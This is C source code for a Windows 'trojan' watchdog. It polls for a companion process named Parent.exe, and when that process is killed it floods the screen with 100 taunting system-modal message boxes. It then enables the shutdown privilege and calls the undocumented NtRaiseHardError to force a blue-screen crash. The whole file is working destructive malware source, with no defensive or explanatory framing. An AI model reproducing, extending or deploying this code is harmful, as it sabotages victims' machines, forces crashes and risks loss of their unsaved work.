#include <Windows.h>
#include <stdlib.h> 
#include <time.h>   
#include <stdio.h>
#include <tlhelp32.h>

#define SHUTDOWN_PRIVILEDGE 19
#define OPTION_BSOD 6

int scrw = 0;
int scrh = 0;


wchar_t* msgs[] = {
	L"You killed my process! Now you are going to die.",
	L"Why would you even do that?",
	L"lmfao great j*b bro <insert skull emoji here>",
	L"GET BETTR HAX! ENJOY BEING BANNED!",
	L"MEOW! MROWWW, Mrow.",
	L"Have you tried turning it off and on again?",
	L"BSOD INCOMING",
	L"VIRUS PRANK (GONE WRONG)",
	L"REST IN PISS, FOREVER MISS.",
	L"YOU KILLED MY TROJAN!\nNow you are going to die.",
};

DWORD mCount = sizeof(msgs) / sizeof(msgs[0]);

/* N0T MY FUNCTION! I DID NOT MAKE THIS RANDOM GENERATOR*/
unsigned int safe_rand()
{
	HCRYPTPROV hProv;
	unsigned int value = 0;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		CryptGenRandom(hProv, sizeof(value), (PBYTE)&value);
		CryptReleaseContext(hProv, 0);
	}
	return value;
}

LRESULT CALLBACK MessageBoxHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HCBT_CREATEWND)
	{
		CBT_CREATEWND* wrapper = (CBT_CREATEWND*)lParam;
		CREATESTRUCT* wndCords = (CREATESTRUCT*)wrapper->lpcs;

		if ((wndCords->style & WS_DLGFRAME) || (wndCords->style & WS_POPUP)) {
			int maxX = (scrw > wndCords->cx) ? (scrw - wndCords->cx) : 0;
			int maxY = (scrh > wndCords->cy) ? (scrh - wndCords->cy) : 0;

			unsigned int rx = 0, ry = 0;
			rx = safe_rand();
			ry = safe_rand();

			wndCords->x = maxX > 0 ? (int)(rx % maxX) : 0;
			wndCords->y = maxY > 0 ? (int)(ry % maxY) : 0;
		}

	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI MessageBoxThread(LPVOID lpParameter)
{
	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);
	HHOOK hhook = SetWindowsHookExA(WH_CBT, (HOOKPROC)MessageBoxHook, NULL, GetCurrentThreadId());
	MessageBoxW(NULL, msgs[safe_rand() % mCount], L"sadge", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hhook);
	return 0;
}

void MessageBoxPayload(void)
{
	scrw = GetSystemMetrics(SM_CXSCREEN);
	scrh = GetSystemMetrics(SM_CYSCREEN);
	for (int i = 0; i < 100; i++)
	{
		CreateThread(NULL, 4096, (LPTHREAD_START_ROUTINE)MessageBoxThread, NULL, 0, NULL);
		Sleep(40);
	}
}

int Brother_Watcher(DWORD *pID)
{
	const wchar_t* brother_name = L"Parent.exe";
	HANDLE hProcesses;
	PROCESSENTRY32W pe32 = { 0 };

	hProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcesses == INVALID_HANDLE_VALUE)
	{
		wprintf(L"Handle To Processes Is Invalid!");
		return EXIT_FAILURE;
	}
	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32FirstW(hProcesses, &pe32))
	{
		wprintf(L"First Process Could Not Be Retrieved!");
		CloseHandle(hProcesses);
		return EXIT_FAILURE;
	}
	
	do
	{
		if (wcscmp(brother_name, pe32.szExeFile) == 0)
		{
			if (pe32.th32ProcessID == 0)
			{
				// Window's didn't set it, so, we will set pID to a failure code of our choice.
				// It's already zero regardless, but this is for readability.
				*pID = 0;
			}
			*pID = pe32.th32ProcessID;
			CloseHandle(hProcesses);
			// The function return's 10 if the process was found. This is my own made up return.
			return 10;
		}
	} 
	while (Process32NextW(hProcesses, &pe32));
	CloseHandle(hProcesses);
	return EXIT_SUCCESS;
}

void ForceRestartWindows()
{
	typedef NTSTATUS (*RtlAdjustPrivilege_t)(
		ULONG Privilege,
		BOOLEAN Enable, 
		BOOLEAN Client,
		PBOOLEAN WasEnabled);

	typedef NTSTATUS (*NtRaiseHardError_t)(
		NTSTATUS ErrorStatus, 
		ULONG NumberOfParameters,
		ULONG UnicodeStringParameterMask, 
		PULONG_PTR Parameters, 
		ULONG ValidResponseOptions,
		PULONG Response);

	HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll == NULL)
	{
		return;
	}
	void* RtlAdjustAddress = GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	void* NtRaiseHardAddress = GetProcAddress(hNtdll, "NtRaiseHardError");
	if (NtRaiseHardAddress != NULL && RtlAdjustAddress != NULL)
	{
		BOOLEAN WasEnabled;
		ULONG Response;
		RtlAdjustPrivilege_t RtlAdjustPriviledge = (RtlAdjustPrivilege_t)RtlAdjustAddress;
		NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)NtRaiseHardAddress;

		RtlAdjustPriviledge(SHUTDOWN_PRIVILEDGE, TRUE, 0, &WasEnabled);
		NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_BSOD, &Response);
	}
	else
	{
		wprintf(L"Not found.");
	}
	return;
}

int main()
{
	DWORD pID = 0;
	while (1)
	{
		Sleep(100);
		if (Brother_Watcher(&pID) == 10)
		{
			if (pID != 0)
			{
				wprintf(L"[FOUND PROCESS] -> pID: %ld\n", pID);
			}
		}
		else
		{
			MessageBoxPayload();
			Sleep(500);
			ForceRestartWindows();
		}
	}
}
